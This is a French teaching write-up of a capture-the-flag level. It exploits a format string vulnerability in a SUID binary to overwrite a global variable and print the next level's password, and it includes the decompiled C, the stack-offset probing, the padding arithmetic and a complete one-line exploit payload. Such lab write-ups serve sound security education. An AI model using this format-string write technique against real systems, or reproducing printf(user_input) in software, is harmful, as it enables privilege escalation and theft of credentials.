# Level4 - README Pédagogique

## 🎯 Objectif
Exploiter une **format string vulnerability** pour écrire la valeur `16930116` (0x1025544) dans la variable globale `m` et déclencher `system("/bin/cat /home/user/level5/.pass")`.

---

## 🔍 Reconnaissance

### Permissions du fichier
```bash
$ ls -l level4
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
    ^
    └─ Bit SUID actif → s'exécute avec les droits de level5
```

### Tests comportementaux
```bash
$ ./level4
test
test

$ python -c "print('%x %x %x')" | ./level4
b7ff26b0 bffff794 0
# → Des valeurs hex s'affichent → Format string vulnerability confirmée
```

---

## 🛠️ Analyse technique

### Code source (décompilé depuis Ghidra)
```c
#include <stdio.h>
#include <stdlib.h>

int m;  // Variable globale, initialisée à 0

void p(char *param)
{
    printf(param);  // ⚠️ Format string vulnerability !
}

void n(void)
{
    char local_20c[520];

    fgets(local_20c, 0x200, stdin);
    p(local_20c);

    if (m == 0x1025544) {   // Si m == 16930116
        system("/bin/cat /home/user/level5/.pass");
    }
}

int main(void)
{
    n();
    return 0;
}
```

**Observations critiques** :
1. `printf(param)` dans `p()` → Format string vulnerability
2. Variable globale `m` à l'adresse `0x08049810`
3. Si `m == 16930116` → le flag est affiché directement

---

## 💣 Vulnérabilité : Format String

Même principe que level3 : `printf()` reçoit directement l'input utilisateur comme format string.

```c
// ❌ Vulnérable :
printf(param);       // param traité comme un FORMAT

// ✅ Sécurisé :
printf("%s", param); // param traité comme une STRING
```

---

## 🔑 Différences avec Level3

| | Level3 | Level4 |
|---|---|---|
| **Valeur à écrire** | 64 | 16930116 |
| **Position buffer** | 4 | 12 |
| **Padding** | `%60x` | `%16930112d` |
| **Format specifier** | `%4$n` | `%12$n` |
| **Résultat** | Shell interactif | Flag affiché directement |
| **Raison position** | `printf` dans `v()` | `printf` dans `p()` appelée depuis `n()` |

---

## 🔑 Concepts clés

### 1. Pourquoi la position est 12 et non 4 ?

Dans level3, `printf()` est appelé **directement** dans `v()`.
Dans level4, `printf()` est appelé dans `p()`, elle-même appelée depuis `n()`.

**L'appel de `p()` depuis `n()` ajoute une stack frame supplémentaire** :

```
Stack de printf() dans level3 :
Position 1-3 : valeurs internes
Position 4   : début de notre buffer ← ici

Stack de printf() dans level4 :
Position 1-3  : valeurs internes de printf
Position 4-11 : stack frame de p() + n() (variables, adresses de retour...)
Position 12   : début de notre buffer ← ici
```

**Résultat** : Le buffer se retrouve plus loin sur la stack → Position 12.

### 2. Padding avec `%d` vs `%x`

Pour le padding, `%d` et `%x` sont **équivalents** :

```
%60x       → Affiche en HEXA sur 60 chars minimum
%60d       → Affiche en DÉCIMAL sur 60 chars minimum
```

Ce qui compte c'est le **nombre de caractères affichés**, pas leur format.
Les deux fonctionnent pour contrôler la valeur écrite par `%n`.

### 3. Conversion 0x1025544 → décimal

```
0x1025544 :

1 × 16^6 = 16777216
0 × 16^5 =        0
2 × 16^4 =   131072
5 × 16^3 =    20480
5 × 16^2 =     1280
4 × 16^1 =       64
4 × 16^0 =        4
─────────────────────
Total    = 16930116
```

**Calcul du padding** :
```
Valeur cible     = 16930116
Adresse affichée = 4 octets
Padding          = 16930116 - 4 = 16930112 → %16930112d
```

### 4. system() avec commande directe

```c
// Level3 : Shell interactif
system("/bin/sh");
// → Lance un shell, on tape les commandes nous-mêmes
// → Besoin du trick (;cat) pour garder stdin ouvert

// Level4 : Commande directe
system("/bin/cat /home/user/level5/.pass");
// → Exécute la commande et affiche le résultat
// → Pas besoin de shell interactif
// → Pas besoin du trick (;cat)
```

---

## 🚀 Construction du payload

### Étape 1 : Trouver l'adresse de `m`
```bash
# Dans Ghidra → cliquer sur la variable m dans n()
# Adresse : 0x08049810
```

### Étape 2 : Trouver la position du buffer
```bash
python -c "print('AAAA' + '%x.'*15)" | ./level4
# ...41414141...
# → "AAAA" = 0x41414141 en position 12
```

### Étape 3 : Calculer le padding
```
Valeur cible     = 16930116 (0x1025544)
Adresse affichée = 4 octets
Padding          = 16930116 - 4 = 16930112 → %16930112d
```

### Étape 4 : Conversion de l'adresse en little-endian
```
0x08049810
  08 04 98 10  (paires)
  10 98 04 08  (inversé)
→ \x10\x98\x04\x08
```

### Payload final
```
[Adresse de m] + [%16930112d] + [%12$n]
\x10\x98\x04\x08 + %16930112d + %12$n
```

### Commande d'exploitation
```bash
python -c "print('\x10\x98\x04\x08' + '%16930112d' + '%12\$n')" | ./level4
```

**Note** : Pas besoin de `; cat` ici car le programme affiche directement le flag.

---

## 🔄 Déroulement de l'exploitation

```
1. fgets() lit notre payload dans local_20c

2. p(local_20c) → printf(local_20c) :
   a. Affiche \x10\x98\x04\x08 (4 chars)
      Compteur interne : 4

   b. Affiche %16930112d (16930112 chars)
      Compteur interne : 16930116

   c. Lit %12$n :
      → Va en position 12 sur la stack
      → Trouve 0x08049810 (adresse de m)
      → Écrit 16930116 à l'adresse 0x08049810
      → m = 16930116 ✅

3. if (m == 0x1025544) → if (16930116 == 16930116) → TRUE !

4. system("/bin/cat /home/user/level5/.pass")
   → Flag affiché directement ! 🎉
```

---

## 📝 Classification

**Type de vulnérabilité** :
- **CWE-134** : Use of Externally-Controlled Format String
- **CWE-250** : Execution with Unnecessary Privileges (SUID)

---

## 🎓 Résumé

1. **Vulnérabilité** : `printf(param)` sans format string explicite
2. **Cible** : Variable globale `m` à l'adresse `0x08049810`
3. **Valeur à écrire** : 16930116 (0x1025544)
4. **Position** : 12 (stack frame supplémentaire due à `p()`)
5. **Payload** : `[adresse de m] + %16930112d + %12$n`
6. **Résultat** : Flag affiché directement (pas de shell interactif)